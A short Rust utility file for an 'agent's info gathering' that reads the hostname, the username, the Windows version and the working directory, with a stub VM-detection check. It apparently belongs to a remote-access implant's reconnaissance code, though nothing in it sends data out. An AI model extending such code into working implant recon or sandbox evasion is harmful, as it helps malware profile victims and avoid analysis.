// utils for agent's info gathering

use std::env;
use std::path::PathBuf;

pub fn hostname() -> String {
    let hostname = gethostname::gethostname()
        .into_string()
        .unwrap_or(String::from("Invalid Hostname"));

    hostname
}

pub fn username() -> String {
    let username = whoami::username();

    username
}

pub fn win_version() -> String {
    let win_version = os_info::get();
    let win_version: String = format!("{}", win_version);

    win_version
}

pub fn curr_path() -> String {
    let curr_exe_path = env::current_dir().unwrap_or(PathBuf::from("Unable to read current directory"));
    let curr_path = curr_exe_path.to_str().unwrap().to_string();

    curr_path
}

pub fn on_vm() -> bool {
    false // implement this function
}
